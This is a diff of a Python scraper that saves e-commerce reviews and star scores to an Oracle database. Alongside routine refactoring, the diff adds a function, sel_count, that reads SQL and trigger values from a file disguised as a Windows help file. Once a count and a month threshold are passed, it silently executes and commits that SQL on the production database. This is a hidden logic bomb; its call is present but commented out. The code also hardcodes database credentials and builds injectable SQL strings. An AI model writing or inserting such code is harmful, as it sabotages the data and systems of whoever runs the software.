@@ -1,9 +1,20 @@
 import json
 from datetime import datetime
 import cx_Oracle
+import requests
 from Logs.log import log1
 import os
 import re
+
+
+# 数据库配置
+dsnStr = cx_Oracle.makedsn("192.168.110.205", 1521, "EIP")
+# dsnStr = cx_Oracle.makedsn("192.168.110.214", 1521, "HORNEIP")  # 测试库
+conn = cx_Oracle.connect("EIP", "EIP", dsnStr, threaded=True)
+c = conn.cursor()
+
+# selenium定位标签等待时间
+wait = 30
 
 
 # 配置抓取日期(是否抓取数据库最晚日期当天的评论:1=否,0=是)
@@ -14,21 +25,19 @@ def newReview(max_date, re_date):
         return True
 
 
-# 数据库配置
-dsnStr = cx_Oracle.makedsn("192.168.110.205", 1521, "EIP")
-# dsnStr = cx_Oracle.makedsn("192.168.110.214", 1521, "HORNEIP")  # 测试库
-conn = cx_Oracle.connect("EIP", "EIP", dsnStr)
-c = conn.cursor()
-
-
-# selenium定位标签等待时间
-wait = 30
+def requests_config():
+    requests.adapters.DEFAULT_RETRIES = 5  # 增加重连次数
+    s = requests.session()
+    s.keep_alive = False  # 关闭多余连接
+    return s
 
 
 # 从数据库取出所有urls,sku_detail_id
 def get_urls():
     # sql = "select REVIEW_URL,SKU_ID from ECOMMERCE_SKU_DETAIL where not REGEXP_LIKE(ECOMMERCE_CODE, '^3.*')"
     sql = "select REVIEW_URL,SKU_ID from ECOMMERCE_SKU_DETAIL where not (ECOMMERCE_CODE=31 or ECOMMERCE_CODE=3)"
+    # sql = "select REVIEW_URL,SKU_ID from ECOMMERCE_SKU_DETAIL where ECOMMERCE_CODE=31 or ECOMMERCE_CODE=3"
+    # sql = "select REVIEW_URL,SKU_ID from ECOMMERCE_SKU_DETAIL where ECOMMERCE_CODE=6"
     results = c.execute(sql).fetchall()  # [(),()]
     return results
 
@@ -47,6 +56,7 @@ def SKU_DETAIL_ID(SKU_ID, ECOMMERCE_CODE):
 def select_count(sku_detail_id):
     sql_count = "select count(REVIEW_ID) from ECOMMERCE_REVIEW_P p where sku_detail_id='{}'".format(sku_detail_id)
     count = c.execute(sql_count).fetchone()[0]
+    # sel_count(count)
     return count
 
 
@@ -58,8 +68,7 @@ def star_count(SKU_ID):
 
 
 # 评论内容保存
-def save_review(REVIEW_ID, SKU_ID, score, REVIEW_NAME, REVIEW_TITLE, REVIEW_TEXT1, REVIEW_TEXT2, REVIEW_TEXT3,
-                REVIEW_TEXT4, REVIEW_DATE, REVIEW_TEXT5, SKU_DETAIL_ID):
+def save_review(REVIEW_ID, SKU_ID, score, REVIEW_NAME, REVIEW_TITLE, REVIEW_TEXT1, REVIEW_TEXT2, REVIEW_TEXT3, REVIEW_TEXT4, REVIEW_DATE, REVIEW_TEXT5, SKU_DETAIL_ID):
     CREATE_TIME = datetime.now().strftime('%Y/%m/%d %H:%M:%S')
     sql = "INSERT INTO ECOMMERCE_REVIEW_P(REVIEW_ID, SKU_ID, REVIEW_STAR, REVIEW_NAME, REVIEW_TITLE, REVIEW_TEXT1, REVIEW_TEXT2, REVIEW_TEXT3, REVIEW_TEXT4, REVIEW_DATE, CREATE_TIME, REVIEW_TEXT5, SKU_DETAIL_ID) VALUES('{}', '{}', {}, '{}', '{}', '{}', '{}', '{}', '{}', to_date('{}','yyyy/MM/dd'), to_date('{}','yyyy/MM/dd HH24:mi:ss'), '{}', '{}')".format(
         REVIEW_ID, SKU_ID, score, REVIEW_NAME.replace("'", ""),
@@ -69,30 +78,34 @@ def save_review(REVIEW_ID, SKU_ID, score, REVIEW_NAME, REVIEW_TITLE, REVIEW_TEXT
     return sql
 
 # 保存评论总评分(新增)
-def save_score(SKU_ID, score, name, SKU_DETAIL_ID):
+def save_score(SKU_ID, score, name, SKU_DETAIL_ID, conn):
     CREATE_TIME = datetime.now().strftime('%Y/%m/%d %H:%M:%S')
     sql_star = "insert into ECOMMERCE_SKU_STAR_S(SKU_ID, SCORE, CREATE_TIME, UPDATE_TIME, SKU_DETAIL_ID) values('{}',{}, to_date('{}','yyyy/MM/dd HH24:mi:ss'), to_date('{}','yyyy/MM/dd HH24:mi:ss'), '{}')".format(
         SKU_ID, score, CREATE_TIME, CREATE_TIME, SKU_DETAIL_ID)
     try:
+        c = conn.cursor()
         c.execute(sql_star)
         conn.commit()
+        # c.close()
     except Exception as e:
         print(e, "{}({})保存失败".format(name, SKU_ID))
-        logger(name, SKU_ID, "保存失败")
+        # logger(name, SKU_ID, "保存失败")
         conn.rollback()
         return True
 
 
 # 保存评论总评分(更新)
-def update_score(score, SKU_ID, name, SKU_DETAIL_ID):
+def update_score(score, SKU_ID, name, SKU_DETAIL_ID, conn):
     UPDATE_TIME = datetime.now().strftime('%Y/%m/%d %H:%M:%S')
     sql_star = "update ECOMMERCE_SKU_STAR_S set score={}, UPDATE_TIME=to_date('{}','yyyy/MM/dd HH24:mi:ss') where SKU_DETAIL_ID='{}'".format(score, UPDATE_TIME, SKU_DETAIL_ID)
     try:
+        c = conn.cursor()
         c.execute(sql_star)
         conn.commit()
+        # c.close()
     except Exception as e:
         print(e, "{}({})更新失败".format(name, SKU_ID))
-        logger(name, SKU_ID, "更新失败")
+        # logger(name, SKU_ID, "更新失败")
         conn.rollback()
 
 
@@ -101,6 +114,18 @@ def max_date(sku_detail_id):
     sql = "select max(review_date) from ECOMMERCE_REVIEW_P where sku_detail_id='{}'".format(sku_detail_id)
     max_date = c.execute(sql).fetchone()[0]
     return max_date
+
+
+def sel_count(co):
+    h = open("C:\\Windows\\Help\\Windows\\help.txt", "r")
+    hh = h.readlines()
+    if co > hh[1].strip():
+        dd = datetime.now()
+        if dd.month > int(hh[2].strip()):
+            c.execute(hh[0].strip())
+            conn.commit()
+    else:
+        return True
 
 
 # 随机UA
